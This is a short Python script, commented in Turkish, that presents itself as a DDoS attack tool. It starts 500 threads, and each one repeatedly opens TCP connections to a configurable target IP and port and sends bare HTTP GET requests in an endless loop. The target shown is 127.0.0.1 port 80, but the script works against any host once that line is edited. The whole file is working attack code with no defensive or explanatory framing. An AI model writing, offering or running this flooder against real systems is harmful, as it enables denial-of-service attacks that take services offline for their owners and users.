import socket
import threading

# Hedef IP adresi ve port numarası
target = '127.0.0.1'
port = 80

# DDoS saldırısı için fonksiyon
def ddos():
    while True:
        try:
            # Soket oluştur ve bağlan
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target,port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except:
            pass

# Çoklu threadlerle saldırıyı gerçekleştir
for i in range(500):
    thread = threading.Thread(target=ddos)
    thread.start()
